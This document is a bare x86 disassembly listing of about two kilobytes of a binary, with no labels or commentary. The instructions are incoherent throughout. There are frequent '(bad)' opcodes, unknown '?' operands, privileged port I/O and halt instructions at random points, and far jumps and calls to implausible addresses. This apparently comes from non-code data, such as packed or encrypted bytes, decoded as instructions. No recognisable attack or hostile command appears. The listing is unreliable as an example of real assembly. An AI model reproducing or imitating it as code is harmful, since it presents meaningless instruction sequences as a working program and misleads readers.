  41d3b0:	ds xchg esi,eax
  41d3b2:	loope  0x41d413
  41d3b4:	and    ah,ah
  41d3b6:	dec    esp
  41d3b7:	fwait
  41d3b8:	push   edx
  41d3b9:	loop   0x41d3a9
  41d3bb:	sbb    DWORD PTR [ebp+0x8f23f02],0x8df116bd
  41d3c5:	int3   
  41d3c6:	pop    edx
  41d3c7:	and    eax,0xd155d314
  41d3cc:	arpl   sp,bx
  41d3ce:	and    eax,0x52c5977e
  41d3d3:	mov    eax,DWORD PTR [eax]
  41d3d5:	jmp    0xa070:0xbe60eedc
  41d3dc:	loope  0x41d456
  41d3de:	pushf  
  41d3df:	(bad)  
  41d3e0:	push   cs
  41d3e1:	add    dh,BYTE PTR [ebx+0x66019e67]
  41d3e7:	stos   BYTE PTR es:[edi],al
  41d3e8:	xor    ah,al
  41d3ea:	push   esi
  41d3eb:	fadd   st,st(5)
  41d3ed:	cmp    BYTE PTR [ebp+eax*1+0x1f],ah
  41d3f1:	cmp    eax,0x876fec80
  41d3f6:	xchg   DWORD PTR [edx+0x43],edi
  41d3f9:	imul   esp,DWORD PTR [ecx-0x3f],0xb
  41d3fd:	ja     0x41d382
  41d3ff:	mov    cl,0x96
  41d401:	fsubr  st,st(5)
  41d403:	mov    ?,WORD PTR [ebx]
  41d405:	arpl   WORD PTR [ecx-0x7],si
  41d408:	pop    esp
  41d409:	imul   esi,DWORD PTR [edi],0xffffff8e
  41d40c:	inc    esi
  41d40d:	lds    edi,FWORD PTR [ecx+0x64]
  41d410:	push   esi
  41d411:	test   eax,0x7fdf724
  41d416:	pop    ecx
  41d417:	adc    cl,0xac
  41d41a:	ret    
  41d41b:	add    al,0xf4
  41d41d:	cmp    DWORD PTR [edx+0x46],esi
  41d420:	push   eax
  41d421:	add    edx,DWORD PTR [eax]
  41d423:	sbb    BYTE PTR [ecx-0x508c5aec],al
  41d429:	lds    ecx,FWORD PTR [esi]
  41d42b:	rcl    DWORD PTR [edi-0x6d9b6906],cl
  41d431:	cld    
  41d432:	loope  0x41d4a1
  41d434:	(bad)  
  41d436:	jl     0x41d404
  41d438:	das    
  41d439:	es mov dl,0x2a
  41d43c:	mov    cl,0x5
  41d43e:	sub    ebx,esp
  41d440:	hlt    
  41d441:	sub    eax,0xcd0de366
  41d446:	out    0x5f,eax
  41d448:	and    BYTE PTR [edi+0x7f],cl
  41d44b:	xchg   BYTE PTR [esi-0x74],ch
  41d44e:	(bad)  
  41d44f:	pop    ss
  41d450:	inc    ecx
  41d451:	xor    eax,0x6ad7f0ef
  41d456:	cmp    DWORD PTR [eax],0xffffffb7
  41d459:	inc    esp
  41d45a:	enter  0x9172,0x6f
  41d45e:	jns    0x41d43d
  41d460:	cli    
  41d461:	inc    ecx
  41d462:	ins    BYTE PTR es:[edi],dx
  41d463:	xchg   esi,eax
  41d464:	jns    0x41d400
  41d466:	pop    ss
  41d467:	mov    ds:0xd07eac0d,eax
  41d46c:	outs   dx,DWORD PTR ds:[esi]
  41d46d:	adc    eax,0x756c3655
  41d472:	jecxz  0x41d4ac
  41d474:	jmp    0xc70d:0x578ac7d5
  41d47b:	and    al,0xa0
  41d47d:	ins    DWORD PTR es:[edi],dx
  41d47e:	mov    al,0x25
  41d480:	fild   QWORD PTR [ecx+0x2a]
  41d483:	sub    dh,BYTE PTR [esi+0x14838c9c]
  41d489:	add    bl,BYTE PTR [edi]
  41d48b:	or     dh,BYTE PTR [eax+0x48e732f5]
  41d491:	add    DWORD PTR [eax],edi
  41d493:	jle    0x41d4bd
  41d495:	pushf  
  41d496:	scas   al,BYTE PTR es:[edi]
  41d497:	int    0x5d
  41d499:	xchg   esp,eax
  41d49a:	cmp    DWORD PTR [ecx],esi
  41d49c:	(bad)
  41d49f:	pop    ebx
  41d4a0:	ror    BYTE PTR [ebp+0x74],0x6f
  41d4a4:	lock dec ebx
  41d4a6:	pop    eax
  41d4a7:	pusha  
  41d4a8:	inc    edi
  41d4a9:	or     ebp,esi
  41d4ab:	jns    0x41d512
  41d4ad:	adc    ebx,DWORD PTR [ebx]
  41d4af:	pushf  
  41d4b0:	ja     0x41d4cd
  41d4b2:	ins    BYTE PTR es:[edi],dx
  41d4b3:	mov    ds:0xf4afc170,al
  41d4b8:	push   es
  41d4b9:	pop    esi
  41d4ba:	mov    ?,edi
  41d4bc:	mov    ebx,0x16a638f1
  41d4c1:	mov    ebp,0x81d69655
  41d4c6:	mov    eax,0x797c96a2
  41d4cb:	gs sbb eax,0x48b5ded4
  41d4d1:	mov    eax,0x242f75c4
  41d4d6:	outs   dx,DWORD PTR ds:[esi]
  41d4d7:	aaa    
  41d4d8:	pop    es
  41d4d9:	shl    DWORD PTR [edx-0xf],cl
  41d4dc:	jne    0x41d4e4
  41d4de:	mov    bh,0xa9
  41d4e0:	mov    ds:0x12b2d4f5,eax
  41d4e5:	test   BYTE PTR [ebx],al
  41d4e7:	lea    edi,[eax-0x37]
  41d4ea:	adc    eax,edx
  41d4ec:	jmp    0x2b35c9e0
  41d4f1:	call   0x2f17:0x633263a6
  41d4f8:	das    
  41d4f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4fa:	imul   ebx,DWORD PTR [edx*8-0x120bae0a],0x50
  41d502:	fdivr  st,st(5)
  41d504:	pushf  
  41d505:	iret   
  41d506:	pusha  
  41d507:	mov    cl,dl
  41d509:	fild   DWORD PTR [ebx+ebx*4+0x75]
  41d50d:	out    0x6c,al
  41d50f:	xchg   edx,eax
  41d510:	push   ecx
  41d511:	in     eax,dx
  41d512:	ins    BYTE PTR es:[edi],dx
  41d513:	sti    
  41d514:	daa    
  41d515:	ret    0xae6d
  41d518:	cmc    
  41d519:	out    0x67,eax
  41d51b:	cwde   
  41d51c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d51d:	xlat   BYTE PTR ds:[ebx]
  41d51e:	jmp    0x3f99261a
  41d523:	(bad)  
  41d524:	mov    al,0x1d
  41d526:	loopne 0x41d519
  41d528:	fstp   QWORD PTR [edi-0x7a6ab1df]
  41d52e:	xchg   esi,eax
  41d52f:	ins    BYTE PTR es:[edi],dx
  41d530:	pop    edi
  41d531:	into   
  41d532:	mov    ebx,0x7c8c91e9
  41d537:	lahf   
  41d538:	js     0x41d5a4
  41d53a:	shl    DWORD PTR [esi+0x66],cl
  41d53d:	or     dl,BYTE PTR [eax+0x2649ac15]
  41d543:	dec    edx
  41d544:	sahf   
  41d545:	gs int3 
  41d547:	call   edx
  41d549:	mov    esi,esi
  41d54b:	(bad)  
  41d54c:	and    eax,0xa91a2d4c
  41d551:	sbb    ecx,0xffffffee
  41d554:	cmp    eax,0x175a635f
  41d559:	lock mov bh,0x1b
  41d55c:	test   al,bl
  41d55e:	fwait
  41d55f:	hlt    
  41d560:	imul   ecx,DWORD PTR [esi+0x34],0xffffffa1
  41d564:	jno    0x41d4f5
  41d566:	sub    DWORD PTR [eiz*8-0x54d6d72c],esi
  41d56d:	mov    BYTE PTR [ebx+0x61b918a4],ah
  41d573:	or     edx,DWORD PTR [edx-0x5]
  41d576:	xchg   esi,eax
  41d577:	xchg   esi,eax
  41d578:	xchg   esi,eax
  41d579:	mov    ch,0x4b
  41d57b:	add    eax,0x6f055e7
  41d580:	pop    eax
  41d581:	mov    dh,0xaa
  41d583:	jbe    0x41d552
  41d585:	outs   dx,BYTE PTR ds:[esi]
  41d586:	xor    eax,0xa9360671
  41d58b:	into   
  41d58c:	mov    ecx,0x8a293e6d
  41d591:	es mov bl,0x3
  41d594:	mov    eax,DWORD PTR [eax+0xb]
  41d597:	fucom  st(0)
  41d599:	xchg   edx,eax
  41d59a:	sahf   
  41d59b:	fstp   QWORD PTR [eax-0x25]
  41d59e:	int3   
  41d59f:	add    cl,BYTE PTR [ecx+0x3d693e2e]
  41d5a5:	ds aaa 
  41d5a7:	sahf   
  41d5a8:	fisubr DWORD PTR [edi-0x4998436d]
  41d5ae:	dec    eax
  41d5af:	xor    eax,0x596f66dd
  41d5b4:	retf   0xab82
  41d5b7:	mov    ebp,0xb882718b
  41d5bc:	out    0x1e,al
  41d5be:	retf   
  41d5bf:	cmp    DWORD PTR [edx+0x62fc7d09],ebx
  41d5c5:	mov    esi,0xad230c82
  41d5ca:	push   ds
  41d5cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cc:	mov    eax,ds:0xabbba73c
  41d5d1:	rcl    BYTE PTR [esi],0x9
  41d5d4:	adc    eax,ebx
  41d5d6:	pop    edx
  41d5d7:	(bad)  
  41d5d8:	dec    eax
  41d5d9:	sbb    al,BYTE PTR [esi]
  41d5db:	sbb    BYTE PTR [eax+0x22d2fc55],ch
  41d5e1:	sbb    edi,ecx
  41d5e3:	mov    esi,0x7bbb8a40
  41d5e8:	clc    
  41d5e9:	aad    0x89
  41d5eb:	xchg   DWORD PTR [ebp+0x3a],edx
  41d5ee:	clc    
  41d5ef:	vpunpcklwd ymm0,ymm6,YMMWORD PTR [ebx+0x7d21765]
  41d5f7:	ret    
  41d5f8:	pop    ebx
  41d5f9:	fadd   QWORD PTR [ebp+ebp*2+0x59f5a383]
  41d600:	xor    edi,DWORD PTR [esi+0x787b5c8e]
  41d606:	pop    edx
  41d607:	mov    al,ds:0x6aa37c83
  41d60c:	fstp   DWORD PTR ds:0x5554b10
  41d612:	sub    eax,0x9dde5d42
  41d617:	sub    DWORD PTR ds:0x8167fe6f,edi
  41d61d:	adc    ebp,edi
  41d61f:	xchg   ebp,eax
  41d620:	enter  0xe806,0x9f
  41d624:	sti    
  41d625:	fst    DWORD PTR [esi+0x32c21575]
  41d62b:	xchg   DWORD PTR [edx],edx
  41d62d:	mov    ebp,0x86e0c239
  41d632:	sahf   
  41d633:	or     al,0x7c
  41d635:	sub    cl,BYTE PTR [ebx-0x21]
  41d638:	adc    edx,esi
  41d63a:	inc    eax
  41d63b:	add    al,0xf6
  41d63d:	adc    ecx,DWORD PTR [eax+0x7ef11d24]
  41d643:	jl     0x41d67e
  41d645:	pxor   mm3,QWORD PTR [ecx]
  41d648:	in     eax,dx
  41d649:	push   edi
  41d64a:	push   ecx
  41d64b:	pop    esp
  41d64c:	ins    BYTE PTR es:[edi],dx
  41d64d:	push   edx
  41d64e:	add    eax,0x26e29e05
  41d653:	push   di
  41d655:	cmp    BYTE PTR [edi-0x4be06d23],bl
  41d65b:	retf   0x74b4
  41d65e:	jns    0x41d6ae
  41d660:	test   eax,0x1c8a726
  41d665:	sti    
  41d666:	ffreep st(1)
  41d668:	js     0x41d670
  41d66a:	test   DWORD PTR [eax-0x7ce8a36b],ebx
  41d670:	mov    ah,BYTE PTR [eax-0x1]
  41d673:	cmp    ebp,DWORD PTR [eax+0x8]
  41d676:	(bad)
  41d67a:	(bad)  
  41d67b:	hlt    
  41d67c:	sti    
  41d67d:	call   0xd851:0xb8e13ec2
  41d684:	sub    al,dh
  41d686:	mov    cl,BYTE PTR [ebx+esi*4-0x56]
  41d68a:	add    DWORD PTR cs:0xb9dfc114,0x53a3825f
  41d695:	push   esi
  41d696:	push   ebx
  41d697:	cmp    DWORD PTR [esi-0x3aabaa5a],edx
  41d69d:	xor    bh,dh
  41d69f:	pop    edi
  41d6a0:	dec    eax
  41d6a1:	add    al,0xa
  41d6a3:	or     eax,0xf8ba8d36
  41d6a8:	inc    ebp
  41d6a9:	aad    0x35
  41d6ab:	dec    ecx
  41d6ac:	lds    ecx,FWORD PTR [ebx]
  41d6ae:	call   FWORD PTR [ebx-0x7b]
  41d6b1:	inc    ecx
  41d6b2:	or     ah,ch
  41d6b4:	or     dh,BYTE PTR ds:0xdfd45a64
  41d6ba:	inc    eax
  41d6bb:	mov    al,ds:0x4abf2fc
  41d6c0:	sbb    DWORD PTR [ebp+0x3a84ef6d],esp
  41d6c6:	mov    bl,0x32
  41d6c8:	repnz jecxz 0x41d68c
  41d6cb:	sbb    DWORD PTR gs:[ecx],0x88a20299
  41d6d2:	jp     0x41d662
  41d6d4:	arpl   dx,cx
  41d6d6:	mov    edi,0xaeda13b7
  41d6db:	xor    BYTE PTR [esp+eiz*8-0x1f],0xda
  41d6e0:	inc    edi
  41d6e1:	call   0x9a77:0xb420814d
  41d6e8:	pop    edx
  41d6e9:	or     dl,BYTE PTR [edx*8+0x1e4212dd]
  41d6f0:	idiv   esi
  41d6f2:	xor    dl,0x72
  41d6f5:	popf   
  41d6f6:	jge    0x41d6bc
  41d6f8:	in     eax,0xc7
  41d6fa:	and    al,0xe6
  41d6fc:	xor    dh,BYTE PTR [eax-0x3617835e]
  41d702:	adc    al,0xc5
  41d704:	inc    esp
  41d705:	sar    DWORD PTR [esi+0x14],1
  41d708:	lock mov edi,0x292f1312
  41d70e:	int    0xa3
  41d710:	sbb    al,0xca
  41d712:	lods   eax,DWORD PTR ds:[esi]
  41d713:	push   ebx
  41d714:	outs   dx,DWORD PTR ds:[esi]
  41d715:	ins    BYTE PTR es:[edi],dx
  41d716:	out    dx,al
  41d717:	test   eax,0xb5ba7aaf
  41d71c:	fisubr WORD PTR [ecx+0x2d]
  41d71f:	pop    ebp
  41d720:	(bad)  
  41d721:	iret   
  41d722:	in     al,dx
  41d723:	loopne 0x41d717
  41d725:	pop    edi
  41d726:	loope  0x41d709
  41d728:	loop   0x41d6ca
  41d72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d72b:	mov    esp,0x89565bbd
  41d730:	adc    al,BYTE PTR [edx-0x44]
  41d733:	dec    ebp
  41d734:	pop    ebp
  41d735:	add    DWORD PTR [edi+0x2e],ebx
  41d738:	lahf   
  41d739:	popa   
  41d73a:	(bad)  
  41d73b:	pop    eax
  41d73c:	out    dx,al
  41d73d:	mov    ecx,0xf034aa8d
  41d742:	nop
  41d743:	(bad)  [ebx+0x2]
  41d746:	add    esp,DWORD PTR [eax]
  41d748:	(bad)  
  41d749:	pushf  
  41d74a:	mov    esp,0x64fc3203
  41d74f:	cmp    BYTE PTR [edi+0x40],bh
  41d752:	push   esi
  41d753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d754:	jnp    0x41d72d
  41d756:	mov    ecx,0x335b7c70
  41d75b:	addr16 dec ebx
  41d75d:	sub    dl,bh
  41d75f:	mov    esp,0x86f45668
  41d764:	ret    0x3aef
  41d767:	retf   0x4836
  41d76a:	push   cs
  41d76b:	repz loopne 0x41d73e
  41d76e:	icebp  
  41d76f:	mov    esp,0xcde80430
  41d774:	test   eax,0x4b36f2c1
  41d779:	test   ebp,eax
  41d77b:	or     BYTE PTR [eax-0x79],dl
  41d77e:	pop    ds
  41d77f:	pop    edx
  41d780:	in     eax,dx
  41d781:	out    0x50,al
  41d783:	fwait
  41d784:	(bad)  
  41d785:	out    0xd7,al
  41d787:	arpl   WORD PTR [ebx],sp
  41d789:	stc    
  41d78a:	daa    
  41d78b:	adc    ebx,ebp
  41d78d:	ins    DWORD PTR es:[edi],dx
  41d78e:	jnp    0x41d716
  41d790:	test   eax,0x7612dc3f
  41d795:	sbb    dl,0x83
  41d798:	push   edx
  41d799:	push   0x39c053d9
  41d79e:	call   0xe979:0x70b6c8b4
  41d7a5:	daa    
  41d7a6:	test   al,0xe7
  41d7a8:	and    al,0xbb
  41d7aa:	add    BYTE PTR [esi],ch
  41d7ac:	fnstcw WORD PTR [eax+0x237bd336]
  41d7b2:	and    al,0xd6
  41d7b4:	dec    ebp
  41d7b5:	shl    DWORD PTR [ecx+0x1a45cf75],cl
  41d7bb:	jno    0x41d788
  41d7bd:	adc    BYTE PTR [edi-0x3b],bl
  41d7c0:	out    0xaa,eax
  41d7c2:	mov    al,ds:0x9f3c110f
  41d7c7:	ret    0xb02b
  41d7ca:	cmp    edi,DWORD PTR [ebp+edx*4-0x29]
  41d7ce:	pusha  
  41d7cf:	push   ds
  41d7d0:	inc    DWORD PTR [eax+ebx*8+0x19125f4c]
  41d7d7:	sub    BYTE PTR [ecx-0x5d],ch
  41d7da:	xchg   ebp,eax
  41d7db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7dc:	cwde   
  41d7dd:	mov    ebx,0xac65ec20
  41d7e2:	xchg   DWORD PTR [esi],esp
  41d7e4:	test   eax,0x8783ea15
  41d7e9:	cli    
  41d7ea:	ret    
  41d7eb:	shr    BYTE PTR [ecx],1
  41d7ed:	out    dx,eax
  41d7ee:	jp     0x41d7f8
  41d7f0:	retf   0xae22
  41d7f3:	(bad)  
  41d7f4:	xor    ah,al
  41d7f6:	jle    0x41d783
  41d7f8:	sbb    eax,DWORD PTR [ebx]
  41d7fa:	push   cs
  41d7fb:	repnz loope 0x41d789
  41d7fe:	iret   
  41d7ff:	(bad)  
  41d800:	cmp    al,0xab
  41d802:	clc    
  41d803:	fwait
  41d804:	add    eax,0xad913f36
  41d809:	push   edx
  41d80a:	mov    eax,0x37e3e91a
  41d80f:	std    
  41d810:	xchg   esp,eax
  41d811:	dec    ebp
  41d812:	xor    esi,DWORD PTR [edx+0x4c95d8a1]
  41d818:	dec    ebp
  41d819:	lds    esi,FWORD PTR [ebp-0x56d1c415]
  41d81f:	fwait
  41d820:	arpl   WORD PTR [eax+0x53cc1f65],bp
  41d826:	jp     0x41d861
  41d828:	jne    0x41d804
  41d82a:	call   0xcc2eac60
  41d82f:	iret   
  41d830:	stc    
  41d831:	or     al,0xbe
  41d833:	fisub  WORD PTR [eax+edx*2]
  41d836:	aad    0x15
  41d838:	push   ebp
  41d839:	loope  0x41d7eb
  41d83b:	push   ebp
  41d83c:	add    edx,DWORD PTR ds:[edx+0xdc7a9d3]
  41d843:	leave  
  41d844:	test   BYTE PTR [ebp-0x4b693333],dh
  41d84a:	lock mov ebx,0x57db8e46
  41d850:	dec    esi
  41d851:	dec    eax
  41d852:	ret    0xf6e7
  41d855:	enter  0x75c4,0x6f
  41d859:	fisubr WORD PTR [edi+0x3ebfe95b]
  41d85f:	fsubp  st(0),st
  41d861:	and    bl,BYTE PTR [ebx+0x692dec21]
  41d867:	lahf   
  41d868:	adc    BYTE PTR [edi+0x3a],ah
  41d86b:	cmp    DWORD PTR [esp+ebx*8-0x62],0x518a824f
  41d873:	pop    ecx
  41d874:	sahf   
  41d875:	or     eax,0x67acd176
  41d87a:	sub    bl,BYTE PTR [eax-0xd]
  41d87d:	pusha  
  41d87e:	es stos DWORD PTR es:[edi],eax
  41d880:	shl    BYTE PTR [esi],1
  41d882:	xor    esi,DWORD PTR [ebx]
  41d884:	stos   BYTE PTR es:[edi],al
  41d885:	fnstenv [esi+0x42]
  41d888:	xchg   esp,eax
  41d889:	inc    ebp
  41d88a:	loopne 0x41d870
  41d88c:	mul    BYTE PTR ds:0xc93e6721
  41d892:	inc    esp
  41d893:	idiv   BYTE PTR [ecx+0x42]
  41d896:	jp     0x41d8a8
  41d898:	mov    edx,0xe932d5de
  41d89d:	jb     0x41d89c
  41d89f:	stc    
  41d8a0:	cmc    
  41d8a1:	repz les edi,FWORD PTR [edi+0x4cf25618]
  41d8a8:	mov    ds,WORD PTR [esi+0x395bc0c]
  41d8ae:	inc    esi
  41d8af:	dec    ebp
  41d8b0:	sbb    DWORD PTR [eax],esp
  41d8b2:	stc    
  41d8b3:	cs push 0xffffffeb
  41d8b6:	enter  0x33db,0xc5
  41d8ba:	sbb    al,0x80
  41d8bc:	shr    DWORD PTR [edi+0x6d],cl
  41d8bf:	sub    esp,DWORD PTR [eax+0x60ed1365]
  41d8c5:	stos   BYTE PTR es:[edi],al
  41d8c6:	and    edi,edi
  41d8c8:	jo     0x41d93e
  41d8ca:	cmc    
  41d8cb:	sub    BYTE PTR [eax+0x5f],0x1c
  41d8cf:	mov    edi,0x17bd25de
  41d8d4:	xchg   edi,eax
  41d8d5:	loop   0x41d931
  41d8d7:	test   eax,0xafa4b46d
  41d8dc:	mov    al,0xd4
  41d8de:	sub    DWORD PTR [ebx],eax
  41d8e0:	inc    edi
  41d8e1:	pop    esp
  41d8e2:	shl    DWORD PTR [edx],0xe9
  41d8e5:	pop    ss
  41d8e6:	push   ds
  41d8e7:	dec    eax
  41d8e8:	jbe    0x41d957
  41d8ea:	pop    ecx
  41d8eb:	mov    ds:0xb1dacf30,eax
  41d8f0:	(bad)  
  41d8f1:	shl    DWORD PTR [ebp-0x2c207cb1],1
  41d8f7:	mov    al,ds:0x25d30b64
  41d8fc:	cmp    BYTE PTR [ecx+0xe],cl
  41d8ff:	mov    dl,0x44
  41d901:	jmp    0x2afc:0xf410f351
  41d908:	mov    ebx,0x97afcab0
  41d90d:	mov    dl,0x3f
  41d90f:	pop    ebp
  41d910:	sti    
  41d911:	push   ss
  41d912:	stos   DWORD PTR es:[edi],eax
  41d913:	sub    eax,0xceefc029
  41d918:	and    BYTE PTR [ecx+0x14d7f2b4],cl
  41d91e:	inc    edx
  41d91f:	test   DWORD PTR [ecx+0x7f1bc281],edx
  41d925:	das    
  41d926:	mov    ds:0x57bd51cb,eax
  41d92b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d92c:	pop    esi
  41d92d:	cdq    
  41d92e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d92f:	fsubr  DWORD PTR [esi+0x778e41ce]
  41d935:	pop    ebp
  41d936:	fs mov edx,0xbb46130d
  41d93c:	mov    eax,ds:0x335d1b8f
  41d942:	xchg   edi,eax
  41d943:	ins    DWORD PTR es:[edi],dx
  41d944:	retf   
  41d945:	mov    ch,0xda
  41d947:	je     0x41d909
  41d949:	jae    0x41d90a
  41d94b:	call   DWORD PTR [ebp+esi*8+0x46]
  41d94f:	or     eax,0x32914381
  41d954:	sbb    al,0xab
  41d956:	xchg   edx,eax
  41d957:	inc    ebp
  41d958:	jl     0x41d8e2
  41d95a:	stos   DWORD PTR es:[edi],eax
  41d95b:	mov    eax,ds:0xcbbf0f1f
  41d960:	sbb    BYTE PTR [esi-0x6c],cl
  41d963:	mov    cl,0xfd
  41d965:	pop    es
  41d966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d967:	add    cl,BYTE PTR [edx]
  41d969:	push   es
  41d96a:	jnp    0x41d916
  41d96c:	mov    ecx,0x926bbf03
  41d971:	test   al,0x45
  41d973:	in     eax,dx
  41d974:	mov    edx,0xa31ecb24
  41d979:	or     DWORD PTR [esi+0x7b],esp
  41d97c:	mov    ebx,0xb1abcd31
  41d981:	pusha  
  41d982:	out    0x23,al
  41d984:	test   eax,0xf74f6709
  41d989:	ja     0x41d94c
  41d98b:	push   edi
  41d98c:	stos   BYTE PTR es:[edi],al
  41d98d:	shl    BYTE PTR ds:0xac0e4f69,0x85
  41d994:	aam    0xd
  41d996:	frstor [edi+ecx*8]
  41d999:	xlat   BYTE PTR ds:[ebx]
  41d99a:	gs dec eax
  41d99c:	dec    esp
  41d99d:	push   edx
  41d99e:	sub    eax,0xfd9012b1
  41d9a3:	xchg   ebp,eax
  41d9a4:	rol    BYTE PTR [edi],1
  41d9a6:	rcpps  xmm2,XMMWORD PTR [ebx-0x7a]
  41d9aa:	and    BYTE PTR [ebx-0x7d],0xbf
  41d9ae:	pop    esi
  41d9af:	push   esp
  41d9b0:	jne    0x41d9ce
  41d9b2:	xchg   esi,eax
  41d9b3:	mov    ds:0xbc8c26d1,eax
  41d9b8:	sbb    BYTE PTR [esi-0x4ddec814],0x38
  41d9bf:	es push edx
  41d9c1:	push   edi
  41d9c2:	cmp    al,0xff
  41d9c4:	adc    al,0x2c
  41d9c6:	aad    0x53
  41d9c8:	add    edx,ebx
  41d9ca:	xor    dl,BYTE PTR [ebx-0x2559388]
  41d9d0:	pop    ds
  41d9d1:	into   
  41d9d2:	pop    edi
  41d9d3:	xor    edi,DWORD PTR [ebp-0x445f713f]
  41d9d9:	enter  0xcab3,0xfd
  41d9dd:	popf   
  41d9de:	sbb    eax,0x1c84eca0
  41d9e3:	mov    dl,0xea
  41d9e5:	test   DWORD PTR [esi-0x22],ebp
  41d9e8:	and    eax,DWORD PTR [esi-0x7255952b]
  41d9ee:	dec    ecx
  41d9ef:	jnp    0x41d97a
  41d9f1:	sub    eax,0x4937e076
  41d9f6:	mov    ds:0x46720e52,eax
  41d9fb:	add    ch,BYTE PTR [ebx]
  41d9fd:	mov    bl,0x40
  41d9ff:	add    ch,BYTE PTR [eax-0x25]
  41da02:	mov    es,WORD PTR [eax+0x2d895b1a]
  41da08:	sahf   
  41da09:	mov    esi,0x915e64d3
  41da0e:	mov    eax,ds:0x8bcdf0c0
  41da13:	sub    BYTE PTR ds:0xe6e954b2,al
  41da19:	xchg   DWORD PTR [ebx+ebp*4],eax
  41da1c:	and    bh,BYTE PTR [ebx+esi*2]
  41da1f:	(bad)  
  41da20:	sbb    al,0x52
  41da22:	std    
  41da23:	test   DWORD PTR [ebx-0xc],esp
  41da26:	or     cl,BYTE PTR [edx+edi*2-0x20]
  41da2a:	sahf   
  41da2b:	ins    BYTE PTR es:[edi],dx
  41da2c:	xor    al,0xe3
  41da2e:	cli    
  41da2f:	neg    DWORD PTR [ecx]
  41da31:	jl     0x41da32
  41da33:	sub    al,0xe6
  41da35:	les    edi,FWORD PTR [ebx-0x7b]
  41da38:	xlat   BYTE PTR ds:[ebx]
  41da39:	mov    ebx,DWORD PTR [edi]
  41da3b:	(bad)  
  41da3c:	jge    0x41d9df
  41da3e:	sbb    al,0x1c
  41da40:	xchg   esi,eax
  41da41:	stc    
  41da42:	adc    dh,BYTE PTR [edi+0x38d4f580]
  41da48:	sti    
  41da49:	or     esp,DWORD PTR [eax]
  41da4b:	mov    eax,ds:0xf6e3479b
  41da50:	mov    ebp,0xfa5f9915
  41da55:	jl     0x41da06
  41da57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da58:	or     cl,BYTE PTR [ebp+0x1]
  41da5b:	addr16 inc edi
  41da5d:	pop    eax
  41da5e:	pop    edx
  41da5f:	lods   al,BYTE PTR ds:[esi]
  41da60:	je     0x41da58
  41da62:	push   0x638a6bfd
  41da67:	dec    edi
  41da68:	(bad)  
  41da69:	jmp    0x2ab07826
  41da6e:	cwde   
  41da6f:	fadd   DWORD PTR [edx+0x7b]
  41da72:	leave  
  41da73:	sbb    eax,0xb11c4128
  41da78:	xor    al,0xf9
  41da7a:	cmp    BYTE PTR [ecx-0x40],ch
  41da7d:	jns    0x41da1c
  41da7f:	ret    0xc831
  41da82:	mov    ch,0x1f
  41da84:	adc    BYTE PTR ds:0x4d08a526,bl
  41da8a:	(bad)  
  41da8b:	bound  esi,QWORD PTR [ecx]
  41da8d:	lods   al,BYTE PTR ds:[esi]
  41da8e:	fmulp  st(4),st
  41da90:	cmp    eax,0x99b27814
  41da95:	push   ecx
  41da96:	jb     0x41daca
  41da98:	loop   0x41dabb
  41da9a:	mov    eax,ds:0x76d4d5aa
  41da9f:	jg     0x41da96
  41daa1:	and    eax,0xef9f6995
  41daa6:	xor    eax,0x37dabba
  41daab:	pusha  
  41daac:	fidiv  WORD PTR [ecx-0x7f28f600]
  41dab2:	and    al,0x87
  41dab4:	inc    eax
  41dab5:	pop    esi
  41dab6:	outs   dx,DWORD PTR ds:[esi]
  41dab7:	pop    edi
  41dab8:	xchg   esi,eax
  41dab9:	add    DWORD PTR [edi+esi*4+0x2b],0x9e0c717d
  41dac1:	sub    DWORD PTR [edx+0x60],edx
  41dac4:	push   ss
  41dac5:	dec    ebx
  41dac6:	jge    0x41db12
  41dac8:	and    al,0x26
  41daca:	out    dx,al
  41dacb:	mov    esi,0xffc59a1f
  41dad0:	inc    esi
  41dad1:	cmp    DWORD PTR [esi+0x34117681],0xffffffa1
  41dad8:	pushf  
  41dad9:	add    ebx,ebx
  41dadb:	sbb    al,0x80
  41dadd:	fmul   DWORD PTR [ebx-0xc1188ef]
  41dae3:	jo     0x41da6d
  41dae5:	in     eax,0xd3
  41dae7:	mov    dh,0x91
  41dae9:	adc    eax,0x316c880d
  41daee:	fist   WORD PTR [esi-0x6e684e94]
  41daf4:	mov    edx,0xb1c006e3
  41daf9:	xor    al,0xee
  41dafb:	fstp   QWORD PTR [ecx-0x4cba78a4]
  41db01:	into   
  41db02:	bound  eax,QWORD PTR [ecx+0x6]
  41db05:	shl    DWORD PTR [esi+0x46],cl
  41db08:	xor    BYTE PTR [edx+0x7e],dh
  41db0b:	inc    esp
  41db0c:	fnstcw WORD PTR [eax+0x672c293d]
  41db12:	mov    dl,0xc
  41db14:	jo     0x41daca
  41db16:	clc    
  41db17:	aas    
  41db18:	or     dh,BYTE PTR [eax+0x5974c52c]
  41db1e:	xchg   si,ax
  41db20:	sbb    al,0x42
  41db23:	shl    edi,0x80
  41db26:	pop    ds
  41db27:	sar    DWORD PTR [esi+eiz*8-0x35],0x69
  41db2c:	sub    dl,cl
  41db2e:	test   al,0xb9
  41db30:	gs xchg ebp,eax
  41db32:	pusha  
  41db33:	sbb    dl,BYTE PTR [ecx-0x46]
  41db36:	out    0xb7,eax
  41db38:	loope  0x41db19
  41db3a:	push   cs
  41db3b:	and    ebp,DWORD PTR [ebp+0x1]
  41db3e:	repz xor al,0xac
  41db41:	jns    0x41db7d
  41db43:	popa   
  41db44:	mov    ebx,0x32d977d7
  41db49:	add    al,0x7c
  41db4b:	dec    eax
  41db4c:	rol    BYTE PTR [ecx+0x335165ae],1
  41db52:	mov    DWORD PTR [esi+0x2e7e90fc],eax
  41db58:	ss dec edx
  41db5a:	ins    BYTE PTR es:[edi],dx
  41db5b:	cmp    al,0xcc
  41db5d:	repnz push 0x9090a5
  41db63:	sbb    eax,0xb1c3c6ee
  41db68:	or     eax,DWORD PTR [esi-0x7da6c539]
  41db6e:	jnp    0x41dbbd
  41db70:	pop    edi
  41db71:	mov    ds:0x6fb2588e,eax
  41db76:	setle  BYTE PTR [ebp+0xd]
  41db7a:	push   0xaf9e2dd5
